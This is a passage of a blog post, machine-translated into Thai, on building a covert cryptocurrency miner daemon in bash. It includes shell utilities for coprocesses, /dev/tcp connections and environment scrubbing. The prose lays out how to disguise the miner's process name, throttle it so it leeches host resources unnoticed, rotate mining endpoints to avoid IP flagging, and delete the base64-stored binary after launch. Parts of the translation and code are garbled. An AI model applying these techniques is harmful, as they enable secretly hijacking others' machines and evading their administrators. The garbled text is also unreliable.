}</code></pre><p>ใช้ประโยชน์จากไพพ์เพื่อสร้างตัวอธิบายไฟล์ที่ไม่ระบุชื่อ ซึ่งไม่ได้ทำงานเหมือนกับตัวอธิบายไฟล์ แต่ก็ดีพอสำหรับ<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>หลับโดยไม่ต้องฟอร์ก โดยการใช้ฟังก์ชันไทม์เอาต์ของ read builtin ในทางที่ผิด มันใช้ตัวอธิบายไฟล์เฉพาะ และเราต้องตรวจสอบให้แน่ใจว่าพร้อมใช้งานเพื่อหลีกเลี่ยงการยุติ<p>มีฟังก์ชั่นเช่น<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> ใช้เพื่อตรวจสอบการใช้งานระบบ ซึ่งทั้งหมดนี้ใช้ประโยชน์จาก linux<code>/proc</code> ไฟล์ที่ไม่มีเครื่องมือเช่น<code>ps</code> ดังนั้นจึงไม่มีการฟอร์ก ทุบตีล้วนๆ<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>โปรเซสร่วมสามารถใช้ได้ตั้งแต่ bash<code>v4</code> พวกเขาเป็นเหมือนงานยกเว้นว่ามีชื่อและตัวอธิบายไฟล์ของตัวเอง<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>เรากำลังเขียน daemon ซึ่งเป็นกระบวนการที่มีอายุการใช้งานยาวนาน และเราใช้ file descriptor หลายตัว เราต้องการทำการล้างข้อมูลเพื่อหลีกเลี่ยงการเกิดขึ้น<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>ฟังก์ชันนี้ขึ้นอยู่กับ<a href=https://ipinfo.io/> ipinfo</a> เพื่อกำหนดภูมิภาคของผู้ปฏิบัติงานซึ่งอนุญาตให้ปรับตรรกะขึ้นอยู่กับภูมิภาค<a href=\assets/posts/geoip.json> geoip.json</a> จัดกลุ่มประเทศออกเป็นภูมิภาค เนื่องจากเราต้องการภูมิภาคระดับบนสุด และไม่สนใจเฉพาะบางประเทศ<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash รองรับการเชื่อมต่อ tcp โดยมีสิ่งที่เป็นนามธรรมมากกว่า<code>/dev/tcp</code> (สำหรับ udp ด้วย แต่ส่วนใหญ่มักจะถูกปิดใช้งานในเวลาบิลด์ ดังนั้นคุณจึงไม่สามารถวางใจได้) ไฟล์เหล่านี้เป็นสิ่งทุบตี ไม่ได้เป็นส่วนหนึ่งของ linux<code>/dev</code> ต้นไม้.<p>มูลค่าการกล่าวขวัญถึงระบบล็อคเพื่อจัดการการทำงานพร้อมกันระหว่างงานทุบตี เพื่อให้งานหลายงานสามารถทำงานกับการล็อกได้ พวกเขาทั้งหมดต้องแชร์ตัวอธิบายไฟล์ ดังนั้น .ของเรา<code>locker</code> ซึ่งเป็นงานก็ต้องเริ่มก่อนงานอื่นที่ประสงค์จะใช้ล็อค ตู้เก็บของก็อ่านบน<code>stdin</code> รอการล็อคคำขอตอบสนองบน<code>stdout</code> ขึ้นอยู่กับสถานะบูลีนปัจจุบันที่เก็บไว้ในตัวแปร ฉันไม่รับประกันว่าวิธีการนี้ไม่มีการแข่งขัน แต่ดูเหมือนว่าจะใช้งานได้ดี ในทางกลับกัน ฉันพบว่า file descriptor ไม่น่าเชื่อถือมาก เนื่องจากฉันสงสัยว่ามีบัฟเฟอร์บางตัวที่ไม่ถูกล้างออก<em> ท่อ</em> และในที่สุดก็ถึงขั้นชะงักงัน (ซึ่งหมายความว่าคุณไม่สามารถพึ่งพาล็อกเกอร์ให้คำตอบได้ตลอดเวลา)<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>ล้างขยะของคุณ...โปรแกรมทุบตีที่ซับซ้อนจบลงด้วยการใช้ตัวแปรมากมาย และถ้าคุณใช้พื้นที่ทั่วโลกในทางที่ผิด มันจะบวมขึ้น หากคุณกำลังวางไข่งานเชลล์ พวกมันจะสืบทอดสภาพแวดล้อมทั้งหมด (ซึ่งทำซ้ำได้อย่างมีประสิทธิภาพ ไม่แชร์) คุณสามารถจบลงด้วยการทุบตีกิน<code>100M</code> ของความทรงจำไม่ดี นอกจากนี้เรายังต้องการที่จะเป็นรายละเอียดต่ำ ในสถานการณ์การใช้งานของเรา ปฏิปักษ์<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> อาจมีการเข้าถึงรูทและข้อมูลที่สมบูรณ์เกี่ยวกับกระบวนการของเรา<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> และคุณรู้...ทุกกระบวนการเก็บข้อมูลเกี่ยวกับคำสั่งทั้งหมดที่เริ่มต้น และตัวแปรสภาพแวดล้อมที่ส่งออก<h2 id=configuration><a class=header-anchor href=#configuration> การกำหนดค่า</a></h2><p>เมื่อเรามีสภาพแวดล้อมและเครื่องมือของเราแล้ว เราต้องปรับแต่งเครื่องขุดของเราสำหรับเครื่องที่มันทำงานอยู่ ขั้นตอนการกำหนดค่าในโค้ดหลอก:<ul><li><p>ชื่อกระบวนการสำหรับคนขุดแร่<li><p>ข้อมูลโฮสต์ (ram/cores/caches/<code>ENV_VARS</code>)<li><p>รุ่นการกำหนดค่า<li><p><code>worker_id</code> สำหรับคนขุดแร่ (จาก ip และโฮสต์)<li><p>ip/พอร์ตสำหรับการเชื่อมต่อ</ul><p>จำเป็นต้องเลือกชื่อสำหรับกระบวนการ<em> ซ่อน</em> ความจริงที่ว่าเรากำลังใช้คนงานเหมือง แต่เราไม่เพียงเปลี่ยนชื่อไบนารีของเราเท่านั้น เรามีรายการ<strong> หน้ากาก</strong> สำหรับผู้มีโอกาสเป็นผู้สมัคร (ไฟล์ข้อความธรรมดาที่แต่ละบรรทัดเป็นมาสก์):<ul><li><p>สุ่มเลือกหน้ากาก<li><p>สับเปลี่ยนอิลิเมนต์ของส่วนท้ายของสตริง (ทั้งหมดยกเว้นอันแรก) เพื่อรับคำสั่งโปรเซสที่หลากหลาย ตอนนี้เรามีสตริงที่ดูเหมือน<code>cmd --arg2 --arg1 --arg3</code> . นี่คือหน้ากากนักขุดของเรา เรารันไบนารี่<em> ปราศจาก</em> ข้อโต้แย้ง แต่ดูเหมือนว่าเราเริ่มคำสั่ง<code>cmd</code> มีข้อโต้แย้ง<code>--arg1 --arg2 --arg3</code> . อนุญาตให้เว้นวรรคและขีดคั่นในชื่อไฟล์ ดังนั้นจึงเป็นการดีที่จะรันไบนารีที่มีชื่อแบบนี้ ดูเหมือนว่า linux จะแยกแยะระหว่างไฟล์เรียกทำงานและอาร์กิวเมนต์เมื่อจัดเก็บคำสั่งกระบวนการ<p>การกำหนดค่า miner จะถูกโหลดโดยอัตโนมัติจาก<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> แฮชเรท</a></h3><p>เมื่อเวลาผ่านไป คนขุดแร่ต้นน้ำได้จำนวนมาก<strong> จูนอัตโนมัติ</strong> ทำให้มันเป็นส่วนหนึ่งของสคริปต์ของฉันซ้ำซ้อน แต่ความแตกต่างระหว่างอัปสตรีมและดาวน์สตรีมที่นี่คือเป้าหมายอัปสตรีมคือการเพิ่มให้สูงสุด<em> ประสิทธิภาพ</em> ในขณะที่เป้าหมายของเราคือการเพิ่มสูงสุด<em> ประสิทธิภาพและความสับสน</em> เราไม่ต้องการที่จะแซงระบบเราต้องการปลิงเล็กน้อยโดยไม่หยุดชะงักบริการ<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>สำหรับสิ่งนี้ เราต้องการความเข้าใจที่ละเอียดยิ่งขึ้นเกี่ยวกับสิ่งแวดล้อม<code>l2/l3</code> โครงสร้างแคชของโปรเซสเซอร์ แรม และคอร์ และโปรเซสเซอร์ปัจจุบัน<em> เฉลี่ย</em> โหลดและซีพียู<em> การใช้งาน</em>. ฉันพยายามสร้าง<a href=https://en.wikipedia.org/wiki/Finite-state_machine> เครื่องรัฐ</a> ในทุบตีที่จะเริ่มต้นจากค่าต่ำสุดที่เปลือยเปล่าและลองกำหนดค่าต่างๆ อย่างช้าๆ โดยเฉลี่ยที่ดีที่สุด มันเป็น<strong> ใหญ่</strong> เสียความพยายามเกลื่อนไปด้วย<a href=https://en.wikipedia.org/wiki/Technical_debt> หนี้ทางเทคนิค</a> ที่ล้มละลายอย่างรวดเร็วและส่วนใหญ่ถูกละทิ้งโดยเหลือเพียงเศษซากในฐานรหัส<p>Frack จัมโบ้ที่ปรับแต่งอัตโนมัติทั้งหมดนี้ เราเพิ่งทำให้ miner sleep ขึ้นอยู่กับการใช้งาน/โหลดของโฮสต์ ซึ่งจำเป็นต้องมีการปรับเปลี่ยน miner<code>sleep</code> ระหว่างผลตอบแทนของเธรดและการแก้ไขเล็กน้อยใน watchdog การกำหนดค่า<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> ซึ่งจะทำให้เราสามารถโหลดจำนวนการสลีปใหม่ได้ในขณะรันไทม์ ตรรกะง่ายขึ้นมากและมีลักษณะดังนี้:<ul><li><p>หากการใช้งานอยู่เหนือ/ต่ำกว่า $TARGET_USAGE (± ขอบของข้อผิดพลาด) ให้เพิ่ม/ลดโหมดสลีป<li><p>ถ้าโหลดเฉลี่ยภายใน<code>1m</code> อยู่เหนือ/ต่ำกว่า $TARGET_LOAD หยุดชั่วคราว/ทำการขุดต่อ</ul><h3 id=connection><a class=header-anchor href=#connection> การเชื่อมต่อ</a></h3><p>ในบทสรุปของ bash เราแสดงยูทิลิตี้สำหรับการเชื่อมต่อ ทำไมเราถึงต้องการสิ่งเหล่านี้? เพราะเราต้องการความหลากหลาย การเข้ารหัสปลายทางแบบฮาร์ดในการกำหนดค่าจะใช้เวลาไม่นาน เมื่อมีสิ่งที่น่าสงสัยและมีกิจกรรมเครือข่าย IP จะถูกตั้งค่าสถานะ<p>ในตอนเริ่มต้น เราได้ทดลองด้วยวิธีต่างๆ สองสามวิธี:<ul><li><p>โดยใช้<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> proxychains</a> เพื่อโอเวอร์โหลดการโทรในเครือข่ายของนักขุด แต่จำเป็นต้องมีการสร้างตัวขุดด้วยไลบรารีไดนามิก และคุณต้องส่งพวกเขาพร้อมกับเพย์โหลด ดังนั้นจึงไม่สามารถทำได้<li><p>วิ่ง<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> อุโมงค์ข้างหน้า</a> เคียงข้างกับผู้ขุด: สิ่งนี้มีค่าใช้จ่ายในการกำหนดค่าจำนวนมาก เนื่องจากตอนนี้เรากำลังกำหนดค่าสองกระบวนการในการปรับใช้แต่ละครั้ง ซึ่งมีจำนวนข้อบกพร่องมากขึ้น</ul><p>ในตอนท้ายเราตัดสินโดยเพียงแค่ส่งรายการปลายทาง เก็บไว้ในตัวแปรทุบตี สุ่มเลือกหนึ่งรายการ แน่นอนว่าการเชื่อมต่อถูกเข้ารหัส จุดสิ้นสุดเหล่านี้คืออะไร? ส่งต่อไปยังพร็อกซี่ซึ่งจะจัดการงานคนงานเหมือง<p>ทำไมเราต้องมี<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> พร็อกซี่การขุด</a> ? ฉันไม่เคยผ่านการเชื่อมต่อพร้อมกันประมาณ 100 ครั้ง ดังนั้นพร็อกซีจึงไม่จำเป็นจริงๆ สำหรับการโหลดเครือข่าย แต่สะดวกสำหรับการเจรจาอัลกอริธึมการแฮช และเพื่อให้เป้าหมายความยากต่างกันแก่ผู้ขุดที่แตกต่างกัน เพื่อป้องกันไม่ให้นักขุดทำงาน<strong> ความยาก</strong> เป้าหมายที่ต้องใช้เวลามากเกินไปในการดำเนินการให้เสร็จและหลีกเลี่ยงความเสี่ยงที่จะสูญเสียการคำนวณสำหรับงานที่ยังไม่เสร็จ<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> ซอฟต์แวร์พูลยังต้องมีการปรับเปลี่ยนเล็กน้อยเนื่องจากโฆษณาเป็นพร็อกซีบนคำขอ HTTP ธรรมดาอย่างมีความสุข...<em> ที่ต้องหมดเวลา</em> และส้อมเพิ่มการควบคุมการเข้าถึง ดังนั้นเราจึงใช้ม็อดของเราตามนั้น<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> กำลังแก้ไข json</a></h3><p>ใช้การแก้ไขกับไฟล์ json ด้วย bash ที่เราทำได้ด้วยการแทนที่ env var และ regex บางตัว ตอนแรกเราพึ่ง an<code>envsubst</code> ไบนารีเพื่อใช้ตัวแปรจากนั้นเราก็ทุบตีเต็ม<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> ด้วยตรรกะนี้:<ul><li><p>อ่านเทมเพลตการกำหนดค่า<li><p>แทนที่เครื่องหมายคำพูดทั้งหมดด้วยสตริงที่ลึกลับมาก (like<code>_#_#</code>)<li><p><code>eval</code> แม่แบบ<li><p>แทนที่เหตุการณ์ลึกลับทั้งหมดกลับด้วยเครื่องหมายคำพูด</ul><p>นอกเหนือจากการหลีกเลี่ยงกระบวนการย่อย ข้อดีอีกประการหนึ่งคือเราได้รับความสามารถในการทุบตีที่สมบูรณ์ในเทมเพลตของเรา สำหรับการอ่านและเขียนโดยไม่มีเทมเพลต เราต้องพึ่งพาความสามารถของ bash regex:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>วิธีนี้ช่วยให้เราแก้ไขบรรทัดเดียวได้ สำหรับรายการหลายบรรทัด ให้พิจารณาเฉพาะบรรทัดแรก..แต่ก็เพียงพอสำหรับกรณีการใช้งานของเรา<h2 id=runtime><a class=header-anchor href=#runtime> รันไทม์</a></h2><p>รันไทม์ของเรามีลักษณะอย่างไร? เรามีกระบวนการทุบตีหลักที่เรียกใช้งานลูปหลัก จากนั้นเป็นกระบวนการย่อยของนักขุด กระบวนการย่อยของการตรวจสอบ CPU ตัวล็อกเกอร์ และตัวปรับจูน นั้นก็เกือบๆ กำมือหนึ่งแล้ว<p>อันดับแรก เราต้องการให้แน่ใจว่าหากมีสิ่งผิดปกติเกิดขึ้น เราจะไม่ทิ้งความยุ่งเหยิง ซึ่งหมายความว่าเราใช้ bash trap เพื่อทำการล้างข้อมูลเมื่อสิ้นสุด<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> ยกเลิกการตั้งค่ากับดักเพื่อป้องกันการเรียกซ้ำ กับดักฆ่างานทั้งหมดและลบสภาพแวดล้อมการทำงาน<p>ได้เวลาเริ่มตัวขุดซึ่งจัดเก็บเป็นตัวแปร bash ในการเข้ารหัส base64 เราดัมพ์บนระบบไฟล์ จากนั้นเราดัมพ์ config รัน miner และลบทั้ง miner และ config บน linux คุณสามารถลบไฟล์เรียกทำงานของกระบวนการที่ทำงานอยู่ได้ (ไม่อนุญาตใน windows)<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> เมื่อตัวขุดกำลังทำงานอยู่บนระบบไฟล์มีเพียง a<code>.. /</code> 